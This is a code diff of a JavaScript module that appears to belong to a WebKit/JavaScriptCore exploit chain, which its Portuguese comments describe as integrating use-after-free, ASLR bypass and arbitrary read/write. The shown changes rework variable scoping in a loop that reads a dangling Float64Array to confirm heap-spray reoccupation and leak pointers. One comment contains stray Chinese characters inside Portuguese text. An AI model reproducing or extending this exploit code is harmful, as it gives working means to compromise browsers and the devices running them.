@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v158 - Correção de Escopo de Variáveis)
+// js/script3/testArrayBufferVictimCrash.mjs (v159 - Correção de Escopo e Loop Infinito)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,9 +26,9 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v158_FIX_SCOPE";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v159_FIX_LOOP";
 
-// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
+// Aumentando as pausas para maior稳定性 em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
@@ -408,9 +408,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             let webkit_base_address = null;
             let found_m_mode = null;
 
-            // Variáveis de escopo para a tentativa atual
-            let expected_spray_int64 = null;
-            let initial_fill_int64 = null;
+            // Variáveis de escopo para a tentativa atual (declaradas fora do try-catch interno)
+            let leaked_jsvalue_from_uaf_double_current_attempt = 0;
+            let expected_spray_int64_current_attempt = null;
+            let initial_fill_int64_current_attempt = null;
+
 
             try {
                 logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
@@ -484,9 +486,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     const initial_victim_fill_value = dangling_info.initial_victim_fill_value;
                     const spray_value_double_to_leak_ptr = dangling_info.spray_value_double_to_leak_ptr; // Acessar do objeto retornado
 
-                    // Definir expected_spray_int64 e initial_fill_int64 aqui
-                    expected_spray_int64 = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
-                    initial_fill_int64 = _doubleToInt64_direct(initial_victim_fill_value);
+                    // Definir expected_spray_int64_current_attempt e initial_fill_int64_current_attempt aqui
+                    expected_spray_int64_current_attempt = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
+                    initial_fill_int64_current_attempt = _doubleToInt64_direct(initial_victim_fill_value);
 
                     if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                         logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
@@ -497,29 +499,29 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                     let attempts_read_dangling = 10; // Aumentar tentativas de leitura
                     for (let i = 0; i < attempts_read_dangling; i++) {
                         leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento
-                        const leaked_as_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
+                        const leaked_as_int64_local = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double); // Usar variável local para o loop
                         
-                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts_read_dangling}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
-                        logFn(`[UAF LEAK] Esperado (Spray): ${toHex(expected_spray_int64, 64)}, Inicial (Vítima): ${toHex(initial_fill_int64, 64)}`, "debug");
+                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts_read_dangling}): ${toHex(leaked_as_int64_local, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
+                        logFn(`[UAF LEAK] Esperado (Spray): ${toHex(expected_spray_int64_current_attempt, 64)}, Inicial (Vítima): ${toHex(initial_fill_int64_current_attempt, 64)}`, "debug");
 
 
                         // Se o valor lido for o que esperamos do spray, é um sucesso.
-                        if (leaked_as_int64.equals(expected_spray_int64)) {
+                        if (leaked_as_int64_local.equals(expected_spray_int64_current_attempt)) {
                             logFn(`[UAF LEAK] SUCESSO DE REOCUPAÇÃO! Valor pulverizado lido em dangling_ref[0].`, "good");
                             found_non_zero = true;
                             break;
-                        } else if (leaked_as_int64.equals(initial_fill_int64)) {
+                        } else if (leaked_as_int64_local.equals(initial_fill_int64_current_attempt)) {
                             logFn(`[UAF LEAK] AINDA LENDO VALOR INICIAL de dangling_ref[0]. Spray não reocupou ou offset incorreto.`, "warn");
-                        } else if (!leaked_as_int64.equals(AdvancedInt64.Zero) && !leaked_as_int64.equals(AdvancedInt64.NaNValue)) {
+                        } else if (!leaked_as_int64_local.equals(AdvancedInt64.Zero) && !leaked_as_int64_local.equals(AdvancedInt64.NaNValue)) {
                             // Se é diferente de 0, NaN e do valor inicial, pode ser outra coisa reocupando.
-                            logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
+                            logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64_local, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
                             found_non_zero = true; // Considerar como "não zero", mas não como sucesso.
                             // Não vamos abortar imediatamente aqui, vamos deixar a checagem da tag fazer o trabalho.
                         }
                         await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                     }
 
-                    if (!found_non_zero || !(leaked_as_int64.equals(expected_spray_int64))) { // Usar as variáveis de escopo
+                    if (!found_non_zero || !(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(expected_spray_int64_current_attempt))) { // Usar as variáveis de escopo
                          throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Reocupação de heap falhou.`);
                     }
 
